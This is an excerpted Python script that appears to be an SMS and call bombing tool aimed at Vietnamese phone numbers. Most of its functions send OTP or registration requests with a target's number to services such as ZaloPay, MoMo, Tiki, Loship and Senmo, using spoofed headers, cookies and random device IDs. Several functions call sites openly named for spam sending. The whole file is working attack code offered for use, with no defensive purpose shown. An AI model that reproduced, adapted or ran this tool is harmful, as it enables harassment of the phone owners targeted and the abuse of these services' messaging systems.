...
json_data = {"feature": "register", "phone": "+84" + phone[1:11]}
headers = {
    "Host": "api.zalopay.vn",
...
def zlpay(phone):
    token = requests.get(
        "https://api.zalopay.vn/v2/account/phone/status", params=params, headers=headers
    ).json()["data"]["send_otp_token"]
    json_data = {"phone_number": "0" + phone[1:11], "send_otp_token": token}
    response = requests.post(
        "https://api.zalopay.vn/v2/account/otp", headers=headers, json=json_data
    ).text
...
def momo(phone):
    ...
    t = requests.post(
        "https://api.momo.vn/backend/otp-app/public/SEND_OTP_MSG", headers=h, data=data
    )
    try:
        t = t.json()
    except:
...
def getimei():
    return (
        generateRandomString(8, "0123456789abcdef")
        + "-"
        + generateRandomString(4, "0123456789abcdef")
        + "-"
        + generateRandomString(4, "0123456789abcdef")
        + "-"
        + generateRandomString(4, "0123456789abcdef")
        + "-"
        + generateRandomString(12, "0123456789abcdef")
    )
...
def pop(phone):
    requests.post(
        ...
        headers={
            ...
            "referer": "https://pops.vn/auth/signin-signup/signup?isOffSelectProfile\u003dtrue",
...
def loship(phone):
    requests.post(
        "https://latte.lozi.vn/v1.2/auth/register/phone/initial",
        headers={
            "Host": "latte.lozi.vn",
            "content-length": "101",
            "x-city-id": "50",
...
def minh(phone):
    ...
    response = requests.post(
        "https://spamcallsms.click/", cookies=cookies, headers=headers, data=data
    )
...
def f88(phone):
    requests.post(
        ...
        headers={
            ...
            "traceparent": "00-c7d4ad181d561015110814044adf720e-d3fed9b4added2cf-01",
            "sec-ch-ua-mobile": "?1",
...
def call1(phone):
    requests.post(
        ...
        data=json.dumps({"login": "0" + phone[1:11]}),
    ).text
...
def call2(phone):
    requests.post(
        ...
        json=({"mobilePhone": {"number": "0" + phone[1:11]}}),
    ).text
...
def call3(phone):
    requests.post(
        "https://api.senmo.vn/api/user/send-one-time-password",
        headers={
            "Host": "api.senmo.vn",
            "content-length": "23",
        ...
        data=json.dumps({"phone": "84" + phone[1:11]}),
    ).text
...
def call9(phone):
    cookies = {
        ...
        "sessionid": "%3D",
        "utm_uid": "%3D",
        "ec_cache_utm": "2ecb18ca-827d-53c1-5f1a-7d106859d9e5",
        "ec_cache_client": "false",
        "ec_cache_client_utm": "%7B%22utm_source%22%3A%22accesstrade%22%2C%22utm_medium%22%3A%22cpa%22%2C%22utm_campaign%22%3A%22home%22%2C%22utm_term%22%3A%2255008%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fclick.accesstrade.vn%5C%2F%22%7D",
        "ec_png_client": "false",
        "ec_png_utm": "2ecb18ca-827d-53c1-5f1a-7d106859d9e5",
        "ec_etag_client": "false",
        "ec_png_client_utm": "%7B%22utm_source%22%3A%22accesstrade%22%2C%22utm_medium%22%3A%22cpa%22%2C%22utm_campaign%22%3A%22home%22%2C%22utm_term%22%3A%2255008%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fclick.accesstrade.vn%5C%2F%22%7D",
        "ec_etag_utm": "2ecb18ca-827d-53c1-5f1a-7d106859d9e5",
        "ec_etag_client_utm": "%7B%22utm_source%22%3A%22accesstrade%22%2C%22utm_medium%22%3A%22cpa%22%2C%22utm_campaign%22%3A%22home%22%2C%22utm_term%22%3A%2255008%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fclick.accesstrade.vn%5C%2F%22%7D",
        "uid": "2ecb18ca-827d-53c1-5f1a-7d106859d9e5",
        "client": "false",
        "client_utm": "%7B%22utm_source%22%3A%22accesstrade%22%2C%22utm_medium%22%3A%22cpa%22%2C%22utm_campaign%22%3A%22home%22%2C%22utm_term%22%3A%2255008%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fclick.accesstrade.vn%5C%2F%22%7D",
    }
    ...
    requests.post(
        "https://robocash.vn/register/phone-resend",
        cookies=cookies,
        headers=headers,
        data=data,
    )
...
def concung(phone):
    ...
    response = requests.post(
        "https://concung.com/ajax.html", data=Payload, headers=Headers
    )
...
def cafeland(phone):
    ...
    response = requests.post(
        "https://nhadat.cafeland.vn/member-send-otp/", data=Payload, headers=Headers
    )
...
def funring(phone):
    ...
    response = requests.post(
        "http://funring.vn/api/v1.0.1/jersey/user/getotp", data=Datason, headers=Headers
    )
...
def vieon1(phone):
    ...
    response = requests.post(
        "https://api.vieon.vn/backend/user/register/mobile",
        params=Params,
        data=Payload,
        headers=Headers,
    )
...
###
def tiki(phone):
    response_tiki = requests.post(
        "https://tiki.vn/api/v2/customers/otp_codes", headers=ua, json=jsdt
    ).text
...
def moca(phone):
    home = requests.get(
        "https://moca.vn/moca/v2/users/role", params=paramss, headers=headerss
    ).json()
    token = home["data"]["registrationId"]
    response = requests.post(
        f"https://moca.vn/moca/v2/users/registrations/{token}/verification",
        headers=headerss,
    ).json()
...
def gbay(phone):
    json_data = {
        "phone_number": phone,
        "hash": random_string(40),
    }
    requests.post(
        "https://api-wallet.g-pay.vn/internal/api/v3/users/send-otp-reg-phone",
        json=json_data,
    ).json()
...
def apiv2(phone):
    ...
    response = requests.post(
        "https://onlytrislua.x10.mx/s/user-spam-sms.php",
        cookies=cookies,
        headers=headers,
        data=data,
    )
...
def apiv3(phone):
    ...
    requests.post(
        "https://onlytrislua.x10.mx/download/user-vip-spam-sms.php",
        cookies=cookies,
        headers=headers,
        data=data,
    )
